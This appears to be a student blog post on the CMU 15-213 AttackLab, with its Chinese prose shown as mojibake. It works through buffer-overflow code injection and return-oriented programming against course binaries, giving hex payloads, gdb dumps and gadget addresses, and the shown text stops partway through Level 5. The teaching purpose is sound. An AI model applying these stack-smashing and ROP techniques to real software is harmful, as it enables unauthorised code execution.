---
title: AttackLab
date: 2024-08-16 11:11:49
categories:
- CMU15-213
index_img: /Pictures/CMU15-213/attacklab.jpg
banner_img: /Pictures/CMU15-213/attacklab.jpg
---

# AttackLab

## Labæ¦‚è¿°ï¼š

å­¦ç”Ÿä»¬å°†è·å¾—åä¸º` ctarget` å’Œ `rtarget` çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚ä»–ä»¬è¢«è¦æ±‚é€šè¿‡äº”ç§æ—¥ç›Šå¤æ‚çš„æ”»å‡»æ¥æ”¹å˜ç›®æ ‡çš„è¡Œä¸ºã€‚å¯¹ `ctarget` çš„ä¸‰ç§æ”»å‡»ä½¿ç”¨ä»£ç æ³¨å…¥ã€‚å¯¹ `rtarget` çš„ä¸¤ç§æ”»å‡»ä½¿ç”¨é¢å‘è¿”å›ç¼–ç¨‹ã€‚å®éªŒå®¤æä¾›ä»¥ä¸‹èµ„æºï¼š

1. **`ctarget`**ï¼šä¸€ä¸ªå…·æœ‰ä»£ç æ³¨å…¥æ¼æ´çš„ Linux äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç”¨äºç¬¬ 1-3 é˜¶æ®µçš„å®éªŒã€‚
2. **`rtarget`**ï¼šä¸€ä¸ªå…·æœ‰ ROP æ¼æ´çš„ Linux äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç”¨äºç¬¬ 4-5 é˜¶æ®µçš„å®éªŒã€‚
3. **`cookie.txt`**ï¼šåŒ…å«æœ¬å®éªŒå®¤å®ä¾‹æ‰€éœ€çš„ 4 å­—èŠ‚ç­¾åã€‚
4. **`farm.c`**ï¼šåŒ…å« `rtarget` ä¸­ä½¿ç”¨çš„å°å·¥å…·çš„æºä»£ç ï¼Œä¾›å­¦ç”Ÿç¼–è¯‘å’Œåæ±‡ç¼–ä»¥å¯»æ‰¾æ”»å‡»æ‰€éœ€çš„å·¥å…·ã€‚ 
5. **`hex2raw`**ï¼šä¸€ä¸ªå®ç”¨ç¨‹åºï¼Œç”¨äºç”Ÿæˆå­—èŠ‚åºåˆ—ï¼Œå¸®åŠ©å­¦ç”Ÿåœ¨å®éªŒä¸­æ›´å®¹æ˜“åœ°æ“ä½œå’Œæ³¨å…¥ä»£ç ã€‚

**äºŒè¿›åˆ¶æ–‡ä»¶ï¼š**

`ctarget`å’Œ`rtarget`éƒ½é€šè¿‡å‡½æ•°`getbuf`æ¥æ¥å—è¾“å…¥å­—ç¬¦ä¸²ã€‚

```c
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

ç”±äºå‡½æ•°`Gets()`ä¸èƒ½ç¡®å®šç¼“å†²åŒºå¤§å°æ˜¯å¦è¶³ä»¥å‚¨å­˜`buf`å­—ç¬¦ä¸²ï¼Œå› æ­¤å¯èƒ½å¯¼è‡´ç¼“å†²åŒºæº¢å‡ºçš„é—®é¢˜ã€‚

å½“é”®å…¥çš„å­—ç¬¦ä¸²è¶³å¤ŸçŸ­æ—¶ï¼Œ`ctarget`ä¼šè¿”å›1,åä¹‹ä¼šæŠ¥é”™.

```bash
Cookie: 0x1a7dd803
Type string: Keep it short!
No exploit. Getbuf returned 0x1
Normal return
```

```bash
unix> ./ctarget
Cookie: 0x1a7dd803
Type string: This is not a very interesting string, but it has the property ...
Ouch!: You caused a segmentation fault!
Better luck next time
```

**HEX2RAWï¼š**

HEX2RAW å°†åå…­è¿›åˆ¶æ ¼å¼çš„å­—ç¬¦ä¸²ä½œä¸ºè¾“å…¥ã€‚åœ¨æ­¤æ ¼å¼ä¸­ï¼Œæ¯ä¸ªå­—èŠ‚å€¼ç”±ä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—è¡¨ç¤ºã€‚ä¾‹å¦‚ï¼Œå­—ç¬¦ä¸²â€œ012345â€å¯ä»¥ä»¥åå…­è¿›åˆ¶æ ¼å¼è¾“å…¥â€œ30 31 32 33 34 35 00â€ã€‚ä¼ é€’ç»™ HEX2RAW çš„åå…­è¿›åˆ¶å­—ç¬¦åº”ä»¥ç©ºæ ¼ï¼ˆç©ºæ ¼æˆ–æ¢è¡Œç¬¦ï¼‰åˆ†éš”ã€‚

**ç”Ÿæˆå­—èŠ‚ä»£ç ï¼š**

ä½¿ç”¨GCCä½œä¸ºæ±‡ç¼–å™¨ï¼Œä½¿ç”¨OBJDUMPä½œä¸ºåæ±‡ç¼–å™¨ï¼Œå¯ä»¥æ–¹ä¾¿åœ°ç”ŸæˆæŒ‡ä»¤åºåˆ—çš„å­—èŠ‚ç ã€‚

æ±‡ç¼–å’Œåæ±‡ç¼–æ“ä½œï¼š

```bash
unix> gcc -c example.s
unix> objdump -d example.o > example.d
```



## Part I: Code Injection Attacks

### Level 1

åœ¨è¿™ä¸€éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬ä¸éœ€è¦åŠ å…¥æ–°ä»£ç ï¼Œåªéœ€è¦åˆ©ç”¨å­—ç¬¦ä¸²é‡å®šå‘ç¨‹åºä»¥æ‰§è¡Œç°æœ‰è¿‡ç¨‹ã€‚

åœ¨æ–‡ä»¶`ctarget`ä¸­ï¼Œ`getbuf`å‡½æ•°æœ‰ä»¥ä¸‹çš„è°ƒç”¨ï¼š

```c
void test()
{
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

åŒæ—¶å­˜åœ¨ä¸€ä¸ªå‡½æ•°touch1ï¼š

```c
void touch1()
{
    vlevel = 1;
    printf("Touch1 !: You called touch1()\n");
    validate(1);
    exit(0);
}
```

åœ¨æ‰§è¡Œ`getbuf`åï¼ŒPCä¼šè¿”å›åˆ°`test`å‡½æ•°ä¸­ã€‚æˆ‘ä»¬æƒ³è®©`getbuf` æ‰§è¡Œå…¶ return è¯­å¥æ—¶æ‰§è¡Œ` touch1 `çš„ä»£ç ï¼Œè€Œä¸æ˜¯è¿”å›åˆ°` test`ã€‚

å› æ­¤ï¼Œæˆ‘ä»¬çš„æ€è·¯ä¾¿å¾ˆæ¸…æ™°äº†ï¼šæ‰¾åˆ°`getbuf()`å‡½æ•°å¯¹åº”çš„æ±‡ç¼–ä»£ç ï¼Œåœ¨æ‰§è¡Œ`ret`æŒ‡ä»¤ä¹‹å‰è·³è½¬åˆ°`touch1()`å³å¯ã€‚

æ‰“æ–­ç‚¹å¹¶ä¸”åæ±‡ç¼–ï¼š

```assembly
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret
End of assembler dump.
```

æ³¨æ„åˆ°åˆ†é…äº†0x28=40ä¸ªå­—èŠ‚å¤§å°çš„ç©ºé—´ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦å…ˆå¡«å……40å­—èŠ‚çš„æ— æ•ˆå­—èŠ‚ï¼Œå†å°†ä»£ç æ³¨å…¥åˆ°åå‡ ä¸ªå­—èŠ‚è¦†ç›–æ‰æ ˆå¸§ä¸­å‹å…¥çš„testå‡½æ•°çš„åœ°å€å³å¯ã€‚

åŒæ—¶æ‰¾åˆ°å‡½æ•°`touch1()`çš„å…¥å£åœ°å€ï¼š0x00000000004017c0

ä¾æ®å°ç«¯æ³•ï¼Œæˆ‘ä»¬åœ¨æœ€åå¡«å…¥c0 17 40ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥è¾“å…¥ï¼š

```markdown
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
c0 17 40 00
```

æˆ‘ä»¬å°†å…¶å­˜å…¥ä¸€ä¸ªtxtæ–‡ä»¶ä¸­ï¼Œåˆ©ç”¨**HEX2RAW**è½¬æ¢åè¾“å…¥ï¼š

```bash
./hex2raw < level1.txt > ans1.txt
./ctarget -i ans1.txt -q
```

é€šè¿‡æµ‹è¯•ï¼š

```bash
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40
```

### Level 2

åœ¨`ctarget`ä¸­ï¼Œæœ‰ä¸€ä¸ª`touch2()`å‡½æ•°ï¼š

```c
void touch2(unsigned val)
{
    vlevel = 2;
    if (val == cookie)
    {
        printf("Touch2!:You called touch2(0x%.8x)\n", val);
        validate(2);
    }
    else 
    {
    	printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

æˆ‘ä»¬åœ¨è¿™ä¸€é˜¶æ®µéœ€è¦åšçš„ä¾¿æ˜¯åˆ©ç”¨`getbuf`è°ƒç”¨`touch2`ï¼Œä½†ä¸åŒçš„æ˜¯è¿™æ¬¡æˆ‘ä»¬éœ€è¦ä¼ é€’ä¸€ä¸ªå‚æ•°`val`ã€‚å¾—åˆ°å‡½æ•°åœ°å€ä¸º0x00000000004017ecã€‚

è€Œå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å‚¨å­˜åœ¨å¯„å­˜å™¨`%rdi`ä¸­ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å…ˆå°†cookieå€¼ï¼ˆæ­¤å¤„ä¸º0x59b997faï¼‰ä¼ åˆ°`%rdi`ä¸­ï¼Œå†è°ƒç”¨`touch2`ï¼Œæ±‡ç¼–ä»£ç çœ‹èµ·æ¥æ˜¯è¿™æ ·çš„ï¼š

```assembly
movq	$0x59b997fa,%rdi
call	touch2			
```

ä½†æ ¹æ®è¦æ±‚ä¸ä½¿ç”¨`call`å’Œ`jmp`æŒ‡ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨`ret`æŒ‡ä»¤æ¥ä»£æ›¿ã€‚

```assembly
movq	$0x59b997fa,%rdi
pushq	$0x4017ec	
retq
```

å°†è¿™æ®µä»£ç è¿›è¡Œæ±‡ç¼–ï¼Œå†åæ±‡ç¼–ä¸ºå­—èŠ‚ç ï¼š

```bash
gcc -c level2.s
objdump -d level2.o > level2.byte
```

å¾—åˆ°å­—èŠ‚ç ï¼š

```assembly
level2.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	push   $0x4017ec
   c:	c3                   	ret    
```

æˆ‘ä»¬ä¾¿å¾—åˆ°äº†æ³¨å…¥çš„å­—èŠ‚ç ï¼Œè¿™äº›å­—èŠ‚ç ä¼šéšç€è¯»å–æ“ä½œè€Œè¿›å…¥æ•°ç»„`buf`ä¸­ã€‚ä¸‹ä¸€æ­¥ä¾¿æ˜¯è®©ç¨‹åºè®¡æ•°å™¨`%rip`è·³è½¬åˆ°`buf`çš„èµ·å§‹ä½ç½®æ‰§è¡Œæ³¨å…¥çš„ä»£ç ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç¡®å®šç¼“å†²åŒºçš„èµ·å§‹ä½ç½®ã€‚è¿™é‡Œæˆ‘ä»¬å®é™…è·‘ä¸€ä¸‹ä»£ç ï¼Œç­‰å¾…ç¼“å†²åŒºè®¾å®šå®Œæˆåæ£€æŸ¥`%rsp`å¾—åˆ°ç¼“å†²åŒºèµ·å§‹ä½ç½®ï¼š

```assembly
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
=> 0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret
End of assembler dump.
(gdb) info registers
rax            0x0                 0
rbx            0x55586000          1431855104
rcx            0x0                 0
rdx            0x5561dcc0          1432476864
rsi            0xf4                244
rdi            0x55685fd0          1432903632
rbp            0x55685fe8          0x55685fe8
rsp            0x5561dc78          0x5561dc78
```

å¯çŸ¥ç¼“å†²åŒºèµ·å§‹åœ°å€ä¸º0x5561dc78 

æˆ‘ä»¬ç»„è£…ä¸€ä¸‹å­—èŠ‚ç ï¼š

```
48 c7 c7 fa 97 b9 59 
68 ec 17 40 00 
c3 
00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
78 dc 61 55
```

ç»æ£€æŸ¥æ— è¯¯ã€‚

### Level 3

level 3æ¶‰åŠä¸¤ä¸ªå‡½æ•°ï¼š`hexmatch` å’Œ `touch3`

```c
int hexmatch(unsigned val, char *sval)
{
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}
```

```c
void touch3(char *sval)
{
 	vlevel = 3; /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
	} else {
		printf("Misfire: You called touch3(\"%s\")\n", sval);
		fail(3);
	}
	exit(0);
}
```

å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬è¿™æ¬¡ä¸ä»…éœ€è¦ä¼ é€’å‚æ•°`val=cookie`ï¼ŒåŒæ—¶è¿˜éœ€è¦ä¼ é€’ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°`sval`ã€‚

`char *s = cbuf + random() % 100`ï¼šéšæœºæŒ‡å®š`s`åœ¨`cbuf`ä¸­çš„èµ·å§‹ä½ç½®ã€‚

`sprintf(s, "%.8x", val);`ï¼šä½¿ç”¨ `sprintf` å‡½æ•°å°†æ— ç¬¦å·æ•´æ•° `val(cookie=0x59b997fa)` è½¬æ¢æˆä¸€ä¸ª 8 ä½çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå­˜å‚¨åœ¨æŒ‡é’ˆ `s` æ‰€æŒ‡å‘çš„ä½ç½®ã€‚

`return strncmp(sval, s, 9) == 0;`ï¼šä½¿ç”¨ `strncmp` å‡½æ•°æ¯”è¾ƒ `sval` å’Œ `s` æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²çš„å‰ 9 ä¸ªå­—ç¬¦å®Œå…¨ç›¸åŒï¼Œåˆ™è¿”å› `1`ï¼Œå¦åˆ™è¿”å› `0`ã€‚

ç”±äº`hexmatch`å‡½æ•°è‡ªèº«ç”³è¯·äº†110å­—èŠ‚ç©ºé—´ï¼Œå¹¶ä¸”è°ƒç”¨äº†å…¶å®ƒåº“å‡½æ•°ï¼ˆä¸€èˆ¬æ‰€éœ€å†…å­˜è¾ƒå¤§ï¼‰ï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æ³¨æ„åˆ°è¿™äº›æ“ä½œéƒ½ä¼šè¦†ç›–æˆ‘ä»¬åŸæ¥`getbuf`ç”³è¯·çš„æ ˆç©ºé—´ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è€ƒè™‘å°†æ³¨å…¥çš„ä»£ç å­˜æ”¾åœ¨å…¶å®ƒä¸ä¼šè¢«è¦†ç›–çš„åœ°æ–¹ã€‚

å¯¹åº”ASCIIç ï¼Œæˆ‘ä»¬é¦–å…ˆå°†cookieç¿»è¯‘ä¸ºå­—ç¬¦ä¸²ï¼š59b997fa => 35 39 62 39 39 37 66 61

ç„¶åè€ƒè™‘æ³¨å…¥ä»£ç çš„é€»è¾‘ï¼Œä¸level 2ç±»ä¼¼ï¼š

```assembly
pushq	$0x4018fa		
movq	$0x000000,%rdi	;è¿™é‡Œè¿™ä¸ªç«‹å³æ•°åº”å½“ä¸ºå­˜æ”¾å­—èŠ‚ä»£ç çš„åœ°å€ï¼Œæš‚å®š
retq
```

è¿™é‡Œæˆ‘ä»¬å…ˆå°†å­—ç¬¦ä¸²ä¿å­˜åœ¨`%rsp+8`å¤„çœ‹çœ‹æƒ…å†µå¦‚ä½•ï¼ˆè¿™é‡Œè¿™ä¹ˆé€‰çš„åŸå› æ˜¯ï¼‰ï¼š

```assembly
Dump of assembler code for function touch3:
=> 0x00000000004018fa <+0>:     push   %rbx
   0x00000000004018fb <+1>:     mov    %rdi,%rbx
   0x00000000004018fe <+4>:     movl   $0x3,0x202bd4(%rip)       
   0x0000000000401908 <+14>:    mov    %rdi,%rsi
   0x000000000040190b <+17>:    mov    0x202bd3(%rip),%edi        
   0x0000000000401911 <+23>:    call   0x40184c <hexmatch>
   0x0000000000401916 <+28>:    test   %eax,%eax
```

å¯ä»¥çœ‹åˆ°åœ¨`0x40184c`è°ƒç”¨äº†å‡½æ•°`hexmatch`ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨å‰åæ‰“æ–­ç‚¹ï¼Œæ£€æµ‹æ ˆ`0x5561dc78 `å¼€å§‹çš„åœ°å€å³å¯ï¼š

```assembly
(gdb) x/20x 0x5561dc78
0x5561dc78:     0x4018fa68      0x7c8d4800      0xefc30824      0xefefefef
0x5561dc88:     0xefefefef      0xefefefef      0xefefefef      0xefefefef
0x5561dc98:     0xefefefef      0xefefefef      0x55586000      0x00000000
0x5561dca8:     0x39623935      0x61663739      0x00400000      0x00000000
0x5561dcb8:     0x00000000      0x00000000      0xf4f4f4f4      0xf4f4f4f4
```

å¯ä»¥çœ‹åˆ°ï¼Œåœ¨`0x5561dca8`åé¢å­˜æ”¾çš„8ä¸ªå­—èŠ‚å°±æ˜¯æˆ‘ä»¬çš„cookieå­—ç¬¦ä¸²ã€‚

```assembly
(gdb) x/20x 0x5561dc78
0x5561dc78:     0x9b3b8d00      0xf82d828c      0x5561dca8      0x00000000
0x5561dc88:     0x55685fe8      0x00000000      0x00000004      0x00000000
0x5561dc98:     0x00401916      0x00000000      0x55586000      0x00000000
0x5561dca8:     0x39623935      0x61663739      0x00400000      0x00000000
0x5561dcb8:     0x00000000      0x00000000      0xf4f4f4f4      0xf4f4f4f4
```

è¿æ°”æ¯”è¾ƒå¥½ï¼Œå¹¶æ²¡æœ‰è¢«è¦†ç›–ã€‚äº‹å®ä¸Šï¼Œæˆ‘ä»¬è§‚å¯Ÿå¯ä»¥å‘ç°ï¼Œåœ¨ç¬¬ä¸‰è¡Œ`0x55586000`åçš„åœ°å€å‡ä¸ä¼šè¢«è¦†ç›–ï¼ˆå®é™…ä¸Šè¿™é‡Œå°±æ˜¯`ret`å‰`%rsp`æŒ‡å‘çš„åœ°å€ï¼‰ã€‚å¦‚æœç¡¬ç¼–ç åœ°å€çš„è¯ï¼Œæˆ‘ä»¬é€‰æ‹©`0x5561dca8`å³å¯ï¼Œå†æ§åˆ¶bufä½¿å…¶æº¢å‡ºåˆ°æ­¤ä½ç½®å³å¯ã€‚

```assembly
pushq	$0x4018fa		
movq	$0x5561dca8,%rdi	
retq
```

æœ€ç»ˆç­”æ¡ˆï¼š

```
68 fa 18 40 00 
48 c7 c7 a8 dc 61 55 
c3 
ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff 
ff ff ff ff ff ff ff ff ff ff 
78 dc 61 55 00 00 00 00 
35 39 62 39 39 37 66 61 00
```

ç»æ£€éªŒæ­£ç¡®æ— è¯¯ã€‚

## Part II: Return-Oriented Programming

åœ¨ç¬¬äºŒé˜¶æ®µï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ROPçš„æ¨¡å¼æ¥æ”»å‡»`rtarget`æ–‡ä»¶ã€‚ç›¸æ¯”äº`ctarget`ï¼Œè¯¥æ–‡ä»¶é‡‡å–äº†ä¸€äº›ä¿æŠ¤æªæ–½ï¼Œä¾‹å¦‚æ ˆåœ°å€éšæœºåŒ–å’Œéƒ¨åˆ†æ ˆå†…å®¹æ˜¯åªè¯»çš„ï¼Œæ¥é˜²æ­¢ä»£ç æ³¨å…¥æ”»å‡»ã€‚å› æ­¤æˆ‘ä»¬é‡‡å–*Return-Oriented Programming*çš„æ”»å‡»æ–¹æ³•ã€‚

è¯¥æ–¹æ³•çš„åŸç†æ˜¯ç¨‹åºçš„æ±‡ç¼–è¯­è¨€ä»£ç ä¸­ï¼Œä¼šå‡ºç°æˆ‘ä»¬éœ€è¦çš„ä»£ç ç‰‡æ®µï¼Œåªè¦æˆ‘ä»¬è¿›è¡Œé€‚å½“çš„æˆªå–æ‹¼æ¥ï¼Œä¾¿èƒ½â€œå‡‘â€å‡ºæˆ‘ä»¬çš„æ”»å‡»ä»£ç ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼š

```c
void setval_210(unsigned *p)
{
    *p = 3347663060U;
}
```

ä¸Šè¿°è¿™æ®µä»£ç å°†ä¸€ä¸ªunsignedæŒ‡é’ˆçš„å€¼æ”¹å˜æˆä¸€ä¸ªå¾ˆå¥‡æ€ªçš„æ•°å­—ï¼Œæˆ‘ä»¬è§‚å¯Ÿå®ƒçš„æ±‡ç¼–ä»£ç ä»¥åŠå¯¹åº”çš„å­—èŠ‚ç :

```assembly
0000000000400f15 <setval_210>:
  400f15:       c7 07 d4 48 89 c7       movl   $0xc78948d4,(%rdi)
  400f1b:       c3                      retq
```

ä»åœ°å€`0x400f18`åˆ°`0x400f1b`çš„å››ä¸ªå­—èŠ‚å†…å®¹ä¸º`48 89 c7 c3`ï¼Œç¿»è¯‘ä¸ºæ±‡ç¼–è¯­è¨€å³ä¸ºï¼š

```assembly
movq	%rax,%rdi	 ;48 89 c7
ret					;c3
```

è¿™æ ·çš„ç‰‡æ®µæˆ‘ä»¬ç§°ä¹‹ä¸º**gadget**ï¼Œè‹¥æˆ‘ä»¬åœ¨æ ˆä¸Šæ”¾ç½®ä¸€äº›ç²¾å¿ƒè®¾è®¡çš„gadgetåœ°å€ï¼Œåˆ©ç”¨retå®ç°ä»£ç ä¹‹é—´çš„è·³è½¬ï¼š

![stack](/Pictures/CMU15-213/rop.jpg)

å°±å¯ä»¥è®©ç¨‹åºè¿è¡Œä¸€äº›æˆ‘ä»¬æ‰€æœŸæœ›å®ƒè¿è¡Œçš„ä»£ç ç‰‡æ®µï¼Œä»è€Œå¯ä»¥ç»•è¿‡éšæœºåŒ–æ ˆåœ°å€å’Œåªè¯»æ ˆåœ°å€è¿™ç§ä¿æŠ¤ç­–ç•¥ã€‚

æœ¬é¢˜ä¸­æœ‰ä¸€ä¸ªè¿™æ ·çš„ä»£ç ä»“åº“ï¼Œå«åšfarmï¼Œé¢˜ç›®è¦æ±‚æˆ‘ä»¬åˆ©ç”¨farmé‡Œçš„gadgeté‡æ–°å®Œæˆä¸€élevel2å’Œlevel3çš„æ”»å‡»ï¼Œä¹Ÿå°±æ˜¯level4å’Œlevel5ã€‚

ä¸‹é¢æ˜¯å¯èƒ½ç”¨åˆ°çš„ä»£ç å¯¹åº”çš„å­—èŠ‚ç ï¼š

![ByteEncoding](/Pictures/CMU15-213/ByteEncoding.png)

### Level 4

æˆ‘ä»¬æ‰¾å›Level 2çš„æ±‡ç¼–ä»£ç ï¼š

```assembly
movq	$0x59b997fa,%rdi
pushq	$0x4017ec	
retq
```

æˆ‘ä»¬è¦åšçš„ä¾¿æ˜¯å°†ç«‹å³æ•°cookieç§»åˆ°`%rdi`ä¸­ã€‚ä½†æ˜¯å­˜åœ¨çš„é—®é¢˜æ˜¯æˆ‘ä»¬æ— æ³•åˆ©ç”¨gadgetç›´æ¥æ„é€ cookieï¼Œè¿™å°±è¯´æ˜æˆ‘ä»¬åªèƒ½æ‰‹åŠ¨ä¼ å…¥cookieå¹¶å‚¨å­˜åœ¨æ ˆä¸­ï¼Œåˆ©ç”¨å…¶å®ƒæŒ‡ä»¤å†è¿›è¡Œè°ƒç”¨ã€‚

åœ¨å’Œæ ˆè¿›è¡Œæ•°æ®äº¤äº’çš„æŒ‡ä»¤ä¸­ï¼Œæˆ‘ä»¬è€ƒè™‘`pushq`å’Œ`popq`æŒ‡ä»¤ã€‚å›å¿†ä¸€ä¸‹è¿™ä¸¤ä¸ªæŒ‡ä»¤çš„åŠŸèƒ½ï¼š

| æŒ‡ä»¤    | æ•ˆæœ                               | æè¿°         |
| ------- | ---------------------------------- | ------------ |
| pushq S | R[%rsp]-8 â†’ R[%rsp];S â†’ M[R[%rsp]] | å°†å››å­—å‹å…¥æ ˆ |
| popq D  | M[R[%rsp]] â†’ D;R[%rsp]+8 â†’ R[%rsp] | å°†å››å­—å¼¹å‡ºæ ˆ |

æˆ‘ä»¬å‘ç°`popq`æŒ‡ä»¤å¯ä»¥å®ç°å°†æ ˆé¡¶çš„å››å­—å‚¨å­˜åˆ°ç›®æ ‡å¯„å­˜å™¨ä¸­ï¼Œè¿™å°±è¯´æ˜æˆ‘ä»¬å¯ä»¥å…ˆå°†cookieä¼ å…¥æ ˆé¡¶ï¼Œåœ¨åˆ©ç”¨è¯¥æŒ‡ä»¤å°†å…¶ç›´æ¥æˆ–é—´æ¥ä¼ é€’åˆ°å¯„å­˜å™¨ä¸­ï¼Œå®ç°æˆ‘ä»¬æ‰€éœ€è¦çš„æ“ä½œã€‚

æˆ‘ä»¬å°†farmè½¬æ¢ä¸ºå¯¹åº”çš„å­—èŠ‚ç ï¼š

```bash
gcc -c farm.c
objdump -d farm.o > farm.s
```

å¾—åˆ°farmä¸­æ¯ä¸ªå‡½æ•°å¯¹åº”çš„å­—èŠ‚ç ï¼Œæ–¹ä¾¿æˆ‘ä»¬æ„é€ gadgetã€‚

ä½†æ˜¯äº‹å®ä¸Šå½“æˆ‘å¾—åˆ°è½¬æ¢ä¹‹åçš„å­—èŠ‚ç æ—¶ï¼Œæˆ‘å‘ç°åœ°å€æ˜¯ä»0x0000å¤„å¼€å§‹çš„ï¼Œè¿™è¯´æ˜ç›´æ¥è½¬æ¢farm.cæ–‡ä»¶ä¸èƒ½å¾—å‡ºè¿è¡Œæ—¶å¯¹åº”gadgetçš„åœ°å€ğŸ˜¥

æ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯å›åˆ°`rtarget`ä¸­ï¼Œç›´æ¥æ‰¾åˆ°å¯¹åº”çš„åœ°å€ï¼š`objdump -d rtarget > rtarget.s`

å®šä½å¦‚ä¸‹ç‰‡æ®µï¼š

```assembly
4019a7: 8d 87 51 73 58 90     lea -0x6fa78caf(%rdi), %eax
4019ad: c3                    retq
```

ä»`0x4019ab`åˆ°`0x4019ad`ä¸º`58 90 c3`ï¼Œå¯¹åº”ï¼š

```assembly
popq	%rax
nop
ret
```

åŒæ ·ï¼Œå®šä½å¦‚ä¸‹ç‰‡æ®µï¼š

```assembly
4019a0: 8d 87 48 89 c7 c3     lea -0x3c3876b8(%rdi), %eax
4019a6: c3                    retq
```

ä»`0x4019a2`åˆ°`0x4019a5`ä¸º`48 89 c7 c3`ï¼Œå¯¹åº”ï¼š

```assembly
movq	%rax,%rdi
```

å› æ­¤æˆ‘ä»¬è¿›è¡Œç»„è£…ï¼š

```
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
ab 19 40 00 00 00 00 00 
fa 97 b9 59 00 00 00 00 
a2 19 40 00 00 00 00 00 
ec 17 40 00 00 00 00 00 
```

### Level 5

åŒæ ·çš„ï¼Œæˆ‘ä»¬ä¾ç„¶æ˜¯å…ˆæ‰¾å‡ºæ‰€éœ€è¦è¿›è¡Œçš„æ“ä½œï¼Œå†è¿›è¡Œæ‹¼å‡‘ã€‚

è¦å¤ç°Level 3 çš„æ“ä½œï¼Œé‡ç‚¹æ˜¯å®šä½å­—ç¬¦ä¸²å­˜å‚¨çš„ä½ç½®ã€‚ç”±äºå­—ç¬¦ä¸²çš„å­˜æ”¾ä½ç½®å–å†³äºæˆ‘ä»¬å‰é¢çš„æ“ä½œçš„æ•°é‡ï¼Œåœ¨è¿™é‡Œç”¨ç¡¬ç¼–ç å¹¶ä¸æ˜¯ä¸€ä¸ªå¥½çš„é€‰æ‹©ï¼Œæˆ‘ä»¬å¯ä»¥è½¬æ¢ä¸€ä¸‹æ€è·¯ï¼Œåˆ©ç”¨`lea`æŒ‡ä»¤ï¼Œä½¿ç”¨å¯„å­˜å™¨å’Œåç§»é‡æ¥è¿›è¡Œå®šä½ã€‚

ç»“åˆfarmçš„ç°æœ‰æŒ‡ä»¤ï¼Œæˆ‘ä»¬åˆæ­¥çš„è®¾æƒ³æ˜¯ï¼š

1. å…ˆå°†`%rsp`åœ°å€å­˜å…¥`%rdi`ï¼Œåç§»é‡å­˜å…¥`%rsi`ï¼Œå…ˆå°†è®¡ç®—åçš„åœ°å€ä¿å­˜åœ¨`%rax`ä¸­ï¼Œå†å°†`%rax`è½¬ç§»åˆ°`%rdi`ä¸­ã€‚è¿™æ˜¯æºäºfarmä¸­çš„ä»£ç ï¼š

   ```assembly
   00000000004019d6 <add_xy>:
     4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
     4019da:	c3                   	retq  
   ```

2. è®¡ç®—åç§»é‡ï¼Œå­˜å…¥å­—ç¬¦

3. è°ƒç”¨touch3

ç¬¬ä¸€æ­¥æ— ç–‘æ˜¯æœ€ä¸ºç¹ççš„ï¼š

- `%rsp` => `%rax` => `%rdi`

  ```assembly
  0000000000401a03 <addval_190>:
